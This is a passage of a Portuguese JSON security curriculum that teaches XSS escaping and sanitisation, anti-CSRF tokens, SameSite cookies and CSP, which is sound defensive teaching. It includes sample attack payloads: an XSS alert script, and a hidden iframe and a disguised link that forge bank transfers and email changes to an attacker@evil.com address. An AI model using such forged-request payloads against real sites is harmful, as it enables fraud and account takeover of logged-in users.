                                    "Adicione logging para registrar entradas suspeitas."
                                  ],
                                  "verification": "Execute o script com 5 payloads XSS conhecidos e confirme que nenhum alerta é disparado no navegador.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Ambiente PHP local (XAMPP ou similar)",
                                    "Composer para ESAPI",
                                    "Payloads XSS de test: OWASP ZAP list"
                                  ],
                                  "tips": "Sempre especifique a codificação para evitar falhas em caracteres especiais.",
                                  "learningObjective": "Aplicar funções de escaping em PHP de forma segura e contextual.",
                                  "commonMistakes": [
                                    "Esquecer ENT_QUOTES, permitindo quepas de aspas simples/dobras.",
                                    "Escapar input em vez de output.",
                                    "Não re-escapar após processamento."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Sanitização em JavaScript com DOMPurify",
                                  "subSteps": [
                                    "Inclua DOMPurify via CDN em uma página HTML com formulário.",
                                    "Crie uma função que sanitize input do usuário antes de inserir no DOM: DOMPurify.sanitize(input).",
                                    "Configure opções como ALLOWED_TAGS e ALLOWED_ATTR para controle fino.",
                                    "Teste inserindo HTML malicioso em innerHTML e observe a neutralização.",
                                    "Integre com um campo de texto rico (ex: contenteditable) para cenários reais."
                                  ],
                                  "verification": "Insira 5 payloads XSS no campo e verifique no DevTools que elementos maliciosos foram removidos.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "DOMPurify CDN",
                                    "Editor HTML/JS local ou CodePen",
                                    "Lista de payloads XSS"
                                  ],
                                  "tips": "Use DOMPurify para sanitização de DOM dinâmico, não para escaping de strings puras.",
                                  "learningObjective": "Usar bibliotecas de sanitização client-side para prevenir XSS em apps web modernas.",
                                  "commonMistakes": [
                                    "Configurar ALLOWED_TAGS muito permissivo.",
                                    "Sanitizar após inserir no DOM.",
                                    "Misturar com innerText em vez de innerHTML."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Integrar em Cenários de Formulários Web Completos",
                                  "subSteps": [
                                    "Desenvolva um formulário web full-stack (PHP backend + JS frontend) para login/comentários.",
                                    "Aplique escaping no backend PHP e sanitização no frontend JS para exibição.",
                                    "Use ferramentas como Burp Suite ou OWASP ZAP para fuzzing de inputs.",
                                    "Implemente validação adicional e rate limiting como camadas extras.",
                                    "Documente o fluxo completo de entrada > processamento > saída segura."
                                  ],
                                  "verification": "Simule 10 ataques variados (XSS refletido, armazenado) e confirme proteção total sem quebras.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Burp Suite Community ou OWASP ZAP",
                                    "Servidor local full-stack",
                                    "Ferramentas de fuzzing online"
                                  ],
                                  "tips": "Teste em múltiplos navegadores e com proxies para capturar tráfego real.",
                                  "learningObjective": "Integrar escaping/sanitização em fluxos reais, validando efetividade contra ataques.",
                                  "commonMistakes": [
                                    "Focar só em um lado (client ou server).",
                                    "Ignorar ataques armazenados em DB.",
                                    "Não testar com payloads encoded (URL, Base64)."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um blog PHP/JS, um usuário submete um comentário com <script>alert('XSS')</script>. No backend, use htmlspecialchars() para armazenar na DB. No frontend, sanitize com DOMPurify antes de exibir, impedindo execução do script.",
                              "finalVerifications": [
                                "Nenhum payload XSS testado executa código malicioso em qualquer contexto.",
                                "Logs mostram entradas suspeitas detectadas e tratadas.",
                                "Aplicação resiste a fuzzing com 50+ payloads variados.",
                                "Documentação do código inclui comentários sobre escaping usado.",
                                "Testes unitários passam para funções de sanitização.",
                                "Integração com outras defesas (CSP, validação) é verificada."
                              ],
                              "assessmentCriteria": [
                                "Precisão no uso de flags/contextos corretos (90%+ acurácia).",
                                "Cobertura completa de cenários (HTML, JS, URL).",
                                "Efetividade comprovada via testes automatizados/manuais.",
                                "Código limpo, legível com comentários explicativos.",
                                "Tempo de resposta da app não degradado (>95% performance).",
                                "Integração segura em stack full (frontend/backend/DB)."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web: Integra com HTML/CSS/JS para manipulação DOM segura.",
                                "Banco de Dados: Previne SQLi indireto via prepared statements complementares.",
                                "Desenvolvimento Ágil: Facilita CI/CD com testes de segurança automatizados.",
                                "Ética em TI: Alinha com conformidade GDPR/OWASP Top 10.",
                                "Análise de Dados: Sanitização preserva integridade em logs de segurança."
                              ],
                              "realWorldApplication": "Em e-commerces como Shopify ou redes sociais como Twitter, previne XSS em comentários/produtos, evitando roubo de sessões, defacement ou propagação de malware, protegendo milhões de usuários diariamente."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.4.2",
                        "name": "Tokens Anti-CSRF",
                        "description": "Mecanismo de proteção contra Cross-Site Request Forgery (CSRF) por meio de tokens únicos e imprevisíveis gerados por servidor, validados em requisições POST, PUT e DELETE.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.4.2.1",
                            "name": "Explicar o funcionamento de ataques CSRF",
                            "description": "Descrever como sites maliciosos forjam requisições em sessões autenticadas, ilustrando com exemplos de iframes ocultos e links falsos, e por que cookies sozinhos falham.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Autenticação Web com Cookies de Sessão",
                                  "subSteps": [
                                    "Estude o ciclo de autenticação HTTP: login envia credenciais, servidor responde com cookie de sessão (ex: Set-Cookie: sessionID=abc123).",
                                    "Abra ferramentas de desenvolvedor no navegador e observe cookies sendo definidos e enviados em requests subsequentes.",
                                    "Crie um diagrama simples mostrando fluxo: Usuário loga → Cookie armazenado → Requests futuras incluem cookie automaticamente.",
                                    "Explique por que cookies são enviados por padrão em requests same-origin e cross-origin para domínios confiáveis.",
                                    "Teste enviando uma requisição GET autenticada via curl ou Postman para ver o cookie em ação."
                                  ],
                                  "verification": "Desenhe e explique um diagrama do fluxo de autenticação com cookies para um parceiro de estudo.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Navegador com DevTools",
                                    "Documentação MDN sobre Cookies HTTP",
                                    "Ferramenta Postman ou curl"
                                  ],
                                  "tips": "Sempre verifique o cabeçalho 'Cookie' nas requisições de rede para visualizar o comportamento real.",
                                  "learningObjective": "Dominar como cookies de sessão mantêm o estado de autenticação sem armazenar credenciais.",
                                  "commonMistakes": [
                                    "Confundir cookies de sessão com tokens JWT",
                                    "Achar que cookies não são enviados cross-site",
                                    "Ignorar que browsers enviam cookies por padrão em GET/POST"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar o Conceito e Mecanismo Básico de Ataques CSRF",
                                  "subSteps": [
                                    "Defina CSRF: Ataque onde site malicioso força navegador da vítima a enviar requisições autenticadas para outro site.",
                                    "Entenda a exploração: Navegador envia cookies automaticamente com requisições cross-origin se vítima estiver logada.",
                                    "Simule conceitualmente: Usuário logado em bank.com visita evil.com, que envia request para bank.com usando cookie da vítima.",
                                    "Discuta stateless do HTTP: Servidor confia no cookie sem verificar origem da requisição.",
                                    "Liste ações vulneráveis: Transferências bancárias, mudança de email, deleções via POST sem verificação extra."
                                  ],
                                  "verification": "Escreva uma definição de CSRF em 100 palavras e identifique 3 ações web comuns vulneráveis.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Artigo OWASP sobre CSRF",
                                    "Papel e caneta para diagrama",
                                    "Vídeo explicativo curto no YouTube sobre CSRF"
                                  ],
                                  "tips": "Pense no navegador como 'traidor' que sempre inclui cookies, independentemente da origem.",
                                  "learningObjective": "Explicar o mecanismo raiz de CSRF como exploração da confiança implícita em cookies.",
                                  "commonMistakes": [
                                    "Confundir CSRF com XSS (CSRF não injeta script)",
                                    "Achar que CSRF requer roubo de cookie",
                                    "Subestimar impacto em requisições idempotentes como GET"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Exemplos Práticos de Ataques CSRF",
                                  "subSteps": [
                                    "Analise exemplo de iframe oculto: <iframe style='display:none' src='https://bank.com/transfer?to=attacker&amount=1000'></iframe> carregado em evil.com.",
                                    "Examine links falsos: <a href='https://bank.com/change-email?new=attacker@evil.com'>Clique aqui para ganhar prêmio</a> disfarçado.",
                                    "Teste em ambiente local: Configure servidor simples com cookie auth e site malicioso para demonstrar request forjada.",
                                    "Observe em DevTools: Como o request do iframe/link inclui cookie da vítima sem interação direta.",
                                    "Compare com img tag: <img src='https://bank.com/action'> para ações GET vulneráveis."
                                  ],
                                  "verification": "Crie e demonstre um PoC local de CSRF usando HTML simples e um servidor de teste.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Servidor local Node.js/Flask",
                                    "Editor de código VS Code",
                                    "OWASP CSRF Cheat Sheet"
                                  ],
                                  "tips": "Use height=0 width=0 para iframes ocultos e teste em abas separadas para simular vítima logada.",
                                  "learningObjective": "Ilustrar CSRF com exemplos concretos de iframes, links e imagens.",
                                  "commonMistakes": [
                                    "Usar HTTPS para PoC sem entender impactos",
                                    "Esquecer de logar vítima antes do teste",
                                    "Confundir falha com CORS (CSRF ignora CORS para cookies simples)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Falhas dos Cookies e Necessidade de Proteções",
                                  "subSteps": [
                                    "Explique limitação: Cookies enviados automaticamente pelo browser sem controle de origem pelo servidor.",
                                    "Discuta Same-Origin Policy: Protege contra leitura cross-site mas não contra envio de requests.",
                                    "Compare com soluções: Tokens anti-CSRF (sincronizador) validados em POSTs mutadores.",
                                    "Liste por que cookies falham sozinhos: Sem estado de 'origem conhecida', confiança cega.",
                                    "Resuma impacto: Milhões de sites vulneráveis historicamente, como breaches em bancos."
                                  ],
                                  "verification": "Escreva parágrafo explicando por que cookies falham e como tokens CSRF resolvem.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Documentação MDN Same-Origin Policy",
                                    "Lista CWE-352 CSRF",
                                    "Exemplos de código anti-CSRF"
                                  ],
                                  "tips": "Lembre: CSRF é 'confusão de navegador', não do servidor.",
                                  "learningObjective": "Compreender limitações inerentes dos cookies e justificar tokens anti-CSRF.",
                                  "commonMistakes": [
                                    "Achar que SameSite=Lax/Strict previne todos CSRF (não para todos cenários)",
                                    "Ignorar que GETs devem ser idempotentes",
                                    "Confundir com session fixation"
                                  ]
                                }
                              ],
                              "practicalExample": "Usuário logado em bank.com (cookie de sessão ativo) visita forum.evil.com. Fórum carrega post com <iframe src='https://bank.com/transferir?conta=123456&valor=5000&confirmar=sim' style='display:none;'></iframe>. Navegador envia POST para bank.com incluindo cookie da vítima, transferindo dinheiro para atacante sem consentimento.",
                              "finalVerifications": [
                                "Descreva CSRF em 3 frases precisas.",
                                "Crie diagrama de fluxo de um ataque com iframe oculto.",
                                "Explique por que cookies de sessão são insuficientes sozinhos.",
                                "Identifique 3 exemplos reais de sites vulneráveis a CSRF.",
                                "Diferencie CSRF de XSS e Clickjacking.",
                                "Simule um PoC local e grave screenshot das DevTools."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica na descrição do mecanismo CSRF (sem erros conceituais).",
                                "Uso de exemplos concretos e corretos (iframes, links, imgs).",
                                "Clareza na explicação de falhas dos cookies e Same-Origin Policy.",
                                "Capacidade de criar PoC funcional e verificável.",
                                "Profundidade em sub-passos e verificações por step.",
                                "Conexão com proteções como tokens anti-CSRF."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: Implementação de forms HTML e handling de sessões em JS/Node.js.",
                                "Redes e Protocolos: Análise profunda de HTTP headers e Same-Origin Policy.",
                                "Ética e Direito: Discussão sobre responsabilidade de desenvolvedores em segurança.",
                                "Programação: Codificação de tokens CSRF em frameworks como Django ou Express.",
                                "Análise de Sistemas: Auditoria de vulnerabilidades em apps web existentes."
                              ],
                              "realWorldApplication": "Em bancos online como Nubank ou apps e-commerce como Amazon, compreensão de CSRF previne fraudes milionárias; desenvolvedores implementam tokens Synchronizer para proteger ações como transferências ou alterações de perfil, reduzindo riscos em OWASP Top 10."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.2.2",
                            "name": "Gerar e validar tokens CSRF",
                            "description": "Implementar geração de tokens usando funções criptográficas como hash_hmac() em PHP ou crypto.randomUUID() em Node.js, integrando em formulários HTML e verificando no backend.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender CSRF e Configurar Ambiente de Desenvolvimento",
                                  "subSteps": [
                                    "Pesquise o que é um ataque CSRF e como tokens anti-CSRF mitigam isso.",
                                    "Configure um ambiente local com PHP ou Node.js, incluindo um servidor web como Apache/Nginx ou Express.",
                                    "Crie uma estrutura básica de projeto com pastas para frontend (HTML) e backend (PHP/JS).",
                                    "Instale bibliotecas necessárias: para PHP, nenhuma extra; para Node.js, express-session e crypto.",
                                    "Teste um formulário HTML simples sem proteção para simular vulnerabilidade."
                                  ],
                                  "verification": "Ambiente rodando com formulário básico acessível via browser, sem erros no console/servidor.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Editor de código (VS Code), servidor local (XAMPP para PHP, Node.js para JS), browser com dev tools.",
                                  "tips": "Use documentação oficial do PHP (hash_hmac) ou Node.js (crypto) para referência rápida.",
                                  "learningObjective": "Compreender o mecanismo de CSRF e preparar um ambiente funcional para implementação.",
                                  "commonMistakes": "Ignorar configuração de sessões, levando a tokens não persistentes; usar portas erradas no servidor."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Geração de Token CSRF no Backend",
                                  "subSteps": [
                                    "Configure gerenciamento de sessões (session_start() em PHP ou express-session em Node.js).",
                                    "Gere um token único usando hash_hmac('sha256', random_bytes(32), session_id()) em PHP ou crypto.randomUUID() + HMAC em Node.js.",
                                    "Armazene o token na sessão do usuário (ex: $_SESSION['csrf_token']).",
                                    "Crie uma rota/endpoint para servir o formulário com o token embedado.",
                                    "Teste geração isolada imprimindo o token no log ou response."
                                  ],
                                  "verification": "Token gerado é único por sessão e exibido corretamente ao carregar a página do formulário.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação PHP/Node.js crypto, Postman para testar endpoints.",
                                  "tips": "Sempre use chaves secretas fortes para HMAC; regenere token após uso.",
                                  "learningObjective": "Dominar a geração segura de tokens CSRF usando funções criptográficas.",
                                  "commonMistakes": "Reutilizar tokens antigos; não usar HMAC, expondo a previsibilidade."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar Token CSRF no Formulário HTML Frontend",
                                  "subSteps": [
                                    "Adicione um campo hidden no formulário: <input type='hidden' name='csrf_token' value='<?php echo $_SESSION['csrf_token']; ?>'>.",
                                    "Para Node.js, renderize o token via template engine como EJS ou passe via API.",
                                    "Garanta que o formulário use método POST e inclua action para o endpoint de processamento.",
                                    "Adicione JavaScript opcional para regenerar token em sessões AJAX.",
                                    "Teste submissão sem token para confirmar rejeição futura."
                                  ],
                                  "verification": "Inspecione HTML no browser: campo hidden presente com token válido.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Browser dev tools, HTML básico.",
                                  "tips": "Evite colocar token em URL ou cookies acessíveis via JS para prevenir XSS.",
                                  "learningObjective": "Integrar tokens de forma segura em interfaces web.",
                                  "commonMistakes": "Expor token em locais visíveis ou não hidden, facilitando roubo."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Validação de Token no Backend",
                                  "subSteps": [
                                    "No endpoint POST, extraia token do $_POST['csrf_token'] ou req.body.csrf_token.",
                                    "Compare com $_SESSION['csrf_token'] usando hash_equals() em PHP ou timing-safe compare em Node.js.",
                                    "Se inválido, retorne erro 403 e regenere token; se válido, processe e delete/regere token.",
                                    "Registre logs de falhas para monitoramento.",
                                    "Teste com token correto, inválido e ausente."
                                  ],
                                  "verification": "Submissão com token válido processa; inválido rejeita com erro apropriado.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Ferramentas de teste como curl ou browser forms.",
                                  "tips": "Use comparações constantes-tempo para evitar timing attacks.",
                                  "learningObjective": "Validar tokens de forma segura e idempotente.",
                                  "commonMistakes": "Comparar strings com == (vulnerável a timing); não deletar token pós-uso."
                                }
                              ],
                              "practicalExample": "Em um formulário de login: Gere token na página login.php, inclua em <input hidden>, valide em process_login.php. Teste atacando de outro site via curl simulando request cross-origin.",
                              "finalVerifications": [
                                "Token é único por sessão e regenerado após uso.",
                                "Validação rejeita tokens inválidos/ausentes com erro 403.",
                                "Não há vazamento de token via network ou source code.",
                                "Funciona em requisições POST/AJAX.",
                                "Logs capturam tentativas falhas.",
                                "Resistente a ataques de timing e reutilização."
                              ],
                              "assessmentCriteria": [
                                "Correção criptográfica na geração (HMAC/UUID forte).",
                                "Integração segura no HTML (hidden, não exposto).",
                                "Validação timing-safe e idempotente.",
                                "Tratamento de erros e logging.",
                                "Testes abrangentes (válido/inválido/cross-site).",
                                "Compatibilidade com PHP/Node.js."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Uso de HMAC e random bytes.",
                                "Desenvolvimento Web: Sessões, forms HTML, APIs REST.",
                                "Segurança de Software: Princípios de defense-in-depth.",
                                "Programação: Manipulação de estado em apps web."
                              ],
                              "realWorldApplication": "Protege sites como bancos online (ex: transferências) ou e-commerces (ex: checkout) contra ataques CSRF, onde atacantes forjam requests usando cookies do usuário autenticado."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.2.1"
                            ]
                          },
                          {
                            "id": "10.1.4.4.2.3",
                            "name": "Configurar proteção SameSite em cookies",
                            "description": "Aplicar atributos SameSite=Strict ou Lax em cookies de sessão para mitigar CSRF em navegadores modernos, testando compatibilidade e cenários de falha.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos do Atributo SameSite em Cookies",
                                  "subSteps": [
                                    "Estude o que são cookies HTTP e seu papel em sessões de usuário.",
                                    "Aprenda sobre ataques CSRF (Cross-Site Request Forgery) e como cookies sem proteção permitem que sites maliciosos usem credenciais do usuário.",
                                    "Diferencie os valores SameSite: Strict (bloqueia todos os cross-site), Lax (permite alguns GET seguros) e None (requer Secure).",
                                    "Analise exemplos de falhas CSRF em aplicações web modernas.",
                                    "Revise documentação oficial do MDN ou WHATWG sobre SameSite."
                                  ],
                                  "verification": "Explique em suas palavras como SameSite mitiga CSRF e liste diferenças entre Strict e Lax.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação MDN Web Docs: SameSite cookies",
                                    "Artigo OWASP sobre CSRF",
                                    "Navegador com DevTools"
                                  ],
                                  "tips": "Use diagramas visuais para mapear fluxos de requests cross-site vs same-site.",
                                  "learningObjective": "Entender o mecanismo de proteção SameSite e seu impacto em CSRF.",
                                  "commonMistakes": [
                                    "Confundir SameSite com Secure/HTTPOnly",
                                    "Ignorar que SameSite=None requer Secure",
                                    "Subestimar diferenças entre navegadores"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar o Atributo SameSite em Cookies de Sessão",
                                  "subSteps": [
                                    "Configure um servidor web local (ex: Node.js com Express ou Apache/Nginx).",
                                    "Implemente cookies de sessão com SameSite=Strict ou Lax usando set-cookie header.",
                                    "Exemplo em Express: res.cookie('sessionId', token, { sameSite: 'strict', secure: true, httpOnly: true }).",
                                    "Ajuste configurações para produção (Secure=true em HTTPS).",
                                    "Salve e reinicie o servidor para aplicar mudanças."
                                  ],
                                  "verification": "Inspecione headers de resposta no DevTools do navegador e confirme presença de SameSite=Strict/Lax.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Node.js/Express instalado",
                                    "Editor de código (VS Code)",
                                    "Servidor local (localhost:3000)"
                                  ],
                                  "tips": "Sempre combine SameSite com HttpOnly e Secure para defesa em profundidade.",
                                  "learningObjective": "Aplicar atributos SameSite corretamente em cookies de servidor.",
                                  "commonMistakes": [
                                    "Esquecer Secure em HTTPS",
                                    "Usar SameSite em cookies não de sessão",
                                    "Não codificar valores corretamente (case-sensitive)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar SameSite com Mecanismos Anti-CSRF Existentes",
                                  "subSteps": [
                                    "Identifique cookies de sessão vulneráveis em sua aplicação.",
                                    "Substitua ou adicione SameSite a tokens CSRF em formulários POST.",
                                    "Teste fluxos de login/logout com cookies protegidos.",
                                    "Implemente fallback para navegadores antigos (polyfill ou detecção via JS).",
                                    "Documente a configuração no código fonte."
                                  ],
                                  "verification": "Simule um fluxo de autenticação e confirme que cookies são enviados apenas em contextos same-site.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Aplicação web de teste com sessões",
                                    "Postman ou curl para simular requests"
                                  ],
                                  "tips": "Use Lax para melhor UX em links externos seguros, Strict para máxima proteção.",
                                  "learningObjective": "Integrar SameSite em fluxos de sessão para fortalecer anti-CSRF.",
                                  "commonMistakes": [
                                    "Não testar POST cross-site",
                                    "Ignorar iframes ou pop-ups",
                                    "Conflitos com CDNs de terceiros"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Compatibilidade e Cenários de Falha",
                                  "subSteps": [
                                    "Teste em múltiplos navegadores (Chrome, Firefox, Safari, Edge).",
                                    "Simule ataques CSRF usando um site malicioso local (ex: HTML com form POST).",
                                    "Verifique logs de console para warnings de SameSite (ex: Chrome 80+).",
                                    "Teste cenários de falha: HTTPS vs HTTP, third-party contexts.",
                                    "Ajuste para compatibilidade (ex: SameSite=None para legacy com Secure)."
                                  ],
                                  "verification": "CSRF simulado falha (cookie não enviado) enquanto requests legítimos succeeds.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Múltiplos navegadores",
                                    "Ferramenta Burp Suite ou OWASP ZAP (gratuito)",
                                    "Sites de teste locais separados"
                                  ],
                                  "tips": "Ative 'SameSite by default cookies' no Chrome para simular comportamentos futuros.",
                                  "learningObjective": "Validar eficácia e compatibilidade da proteção SameSite.",
                                  "commonMistakes": [
                                    "Testar só em um navegador",
                                    "Ignorar mobile browsers",
                                    "Não simular third-party embeds"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma aplicação e-commerce Node.js/Express, configure o cookie de sessão do carrinho de compras com SameSite='Lax' para permitir links de redes sociais compartilharem produtos sem quebrar UX, mas bloqueie POSTs CSRF de sites maliciosos alterando o carrinho.",
                              "finalVerifications": [
                                "Cookies incluem SameSite=Strict/Lax nos headers de resposta.",
                                "Requests cross-site POST não enviam cookies de sessão.",
                                "Fluxos legítimos (mesmo site) funcionam perfeitamente.",
                                "Navegadores modernos não mostram warnings de SameSite.",
                                "Fallback funciona em browsers legacy.",
                                "Logs de segurança confirmam bloqueios de CSRF."
                              ],
                              "assessmentCriteria": [
                                "Explicação precisa de SameSite vs CSRF (80%+ acurácia).",
                                "Configuração correta em código com headers inspecionáveis.",
                                "Testes abrangentes cobrindo 3+ navegadores e cenários.",
                                "Identificação e correção de 2+ erros comuns.",
                                "Documentação clara da implementação.",
                                "Integração sem quebrar funcionalidades existentes."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web (HTTP headers, Express.js/Nginx).",
                                "Desenvolvimento Full-Stack (gestão de sessões e autenticação).",
                                "Testes de Software (unitários para segurança, ferramentas como ZAP).",
                                "Ética em Cibersegurança (defesa proativa vs reativa).",
                                "Redes e Protocolos (HTTPS, browser behaviors)."
                              ],
                              "realWorldApplication": "Em bancos online ou e-commerces como Amazon, SameSite previne CSRF onde atacantes enganam usuários para transferir fundos via links falsos, garantindo que cookies de sessão só sejam usados em interações legítimas do site."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.2.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.4.3",
                        "name": "Content Security Policy (CSP)",
                        "description": "Política de segurança declarada via header HTTP que restringe fontes de scripts, estilos e recursos, prevenindo XSS e injeções de código ao bloquear execuções não autorizadas.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.4.3.1",
                            "name": "Entender diretivas CSP básicas",
                            "description": "Explicar diretivas como default-src, script-src e style-src, e como CSP Level 2/3 mitiga XSS reflected e DOM-based, com exemplos de políticas restritivas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos do Content Security Policy (CSP)",
                                  "subSteps": [
                                    "Pesquise a definição oficial de CSP no MDN Web Docs ou especificação W3C.",
                                    "Identifique os níveis CSP (Level 1, 2 e 3) e suas evoluções.",
                                    "Leia sobre o propósito principal: mitigar ataques XSS declarando fontes confiáveis de conteúdo.",
                                    "Anote exemplos iniciais de cabeçalhos HTTP para CSP.",
                                    "Compare CSP com outras defesas como filtros de input."
                                  ],
                                  "verification": "Resuma em 3 frases o que é CSP e seus benefícios principais.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "MDN Web Docs: Content-Security-Policy",
                                    "Especificação W3C CSP Level 3",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Comece pela visão geral para contextualizar as diretivas específicas.",
                                  "learningObjective": "Entender o escopo e a arquitetura básica do CSP.",
                                  "commonMistakes": [
                                    "Confundir CSP com sanitização de input",
                                    "Ignorar a diferença entre níveis CSP",
                                    "Achar que CSP substitui todas as outras proteções"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Diretivas CSP Básicas: default-src, script-src e style-src",
                                  "subSteps": [
                                    "Estude default-src: diretiva fallback para outras fontes não especificadas.",
                                    "Analise script-src: controla execução de scripts inline, eval() e fontes externas.",
                                    "Examine style-src: gerencia folhas de estilo, incluindo inline e fontes externas.",
                                    "Teste exemplos simples em um cabeçalho HTTP usando ferramentas como browser devtools.",
                                    "Registre como 'none', 'self' e URLs específicas funcionam."
                                  ],
                                  "verification": "Escreva exemplos de cabeçalhos para cada diretiva bloqueando scripts externos.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Browser com DevTools (Chrome/Firefox)",
                                    "Exemplos de cabeçalhos CSP no MDN",
                                    "Editor de texto para simular headers"
                                  ],
                                  "tips": "Use report-uri para monitorar violações durante testes.",
                                  "learningObjective": "Dominar o funcionamento e sintaxe das três diretivas principais.",
                                  "commonMistakes": [
                                    "Usar aspas duplas em valores de nonce/hash",
                                    "Esquecer que default-src é fallback",
                                    "Permitir 'unsafe-inline' sem necessidade"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Mitigação de XSS Reflected e DOM-based com CSP Level 2/3",
                                  "subSteps": [
                                    "Revise tipos de XSS: reflected (via URL/POST) e DOM-based (manipulação client-side).",
                                    "Estude como script-src 'strict-dynamic' e nonces/hashes em Level 2/3 bloqueiam injeções.",
                                    "Simule um ataque reflected injetando <script>alert(1)</script> e aplique CSP restritivo.",
                                    "Teste DOM-based XSS com document.write() e veja bloqueio por CSP.",
                                    "Compare políticas permissivas vs. restritivas (ex: 'self' only)."
                                  ],
                                  "verification": "Demonstre em um HTML local como CSP bloqueia um payload XSS reflected.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "HTML simples com vulnerabilidades XSS",
                                    "Ferramentas como Burp Suite Community ou OWASP ZAP (opcional)",
                                    "Browser DevTools para inspecionar violações CSP"
                                  ],
                                  "tips": "Ative modo 'report-only' para testar sem quebrar o site.",
                                  "learningObjective": "Compreender mecanismos de mitigação específicos para XSS via CSP avançado.",
                                  "commonMistakes": [
                                    "Confundir reflected com stored XSS",
                                    "Ignorar que CSP não mitiga todos os DOM XSS",
                                    "Subestimar bypass via JSONP"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Criar e Testar Políticas CSP Restritivas",
                                  "subSteps": [
                                    "Desenvolva uma política restritiva: Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-xyz'; style-src 'self'.",
                                    "Implemente em um servidor local (ex: Node.js com express ou Python Flask).",
                                    "Teste violações intencionais e verifique console/network para bloqueios.",
                                    "Ajuste para cenários reais, adicionando frame-ancestors e report-to.",
                                    "Documente lições aprendidas em um relatório curto."
                                  ],
                                  "verification": "Configure um site funcional com CSP restritivo que bloqueia XSS simulado.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "Node.js ou Python para servidor local",
                                    "Exemplo de app web vulnerável (DVWA ou similar)",
                                    "Documentação CSP para report-uri"
                                  ],
                                  "tips": "Comece com CSP report-only para depuração iterativa.",
                                  "learningObjective": "Aplicar diretivas em políticas reais e validar eficácia.",
                                  "commonMistakes": [
                                    "Erros de sintaxe no cabeçalho (vírgulas erradas)",
                                    "Não testar em múltiplos browsers",
                                    "Esquecer de atualizar nonces dinamicamente"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure um blog simples em HTML/JS vulnerável a XSS reflected via parâmetro de busca (?q=<script>alert('XSS')</script>). Adicione cabeçalho CSP: default-src 'self'; script-src 'self'; style-src 'self'. Teste: o alert não executa, console mostra violação CSP bloqueada.",
                              "finalVerifications": [
                                "Liste e explique default-src, script-src e style-src com exemplos de valores.",
                                "Descreva como CSP Level 2 usa nonces/hashes para mitigar XSS reflected.",
                                "Simule um DOM XSS e mostre como script-src 'strict-dynamic' previne.",
                                "Crie uma política restritiva para um site e-commerce.",
                                "Identifique 3 limitações do CSP contra XSS avançado.",
                                "Explique diferenças entre CSP Level 2 e 3 em mitigação DOM XSS."
                              ],
                              "assessmentCriteria": [
                                "Precisão na explicação de cada diretiva (100% correta).",
                                "Demonstração prática de mitigação XSS com CSP funcionando.",
                                "Uso correto de termos como 'nonce', 'hash' e 'strict-dynamic'.",
                                "Política restritiva sem brechas desnecessárias.",
                                "Identificação de erros comuns e como evitá-los.",
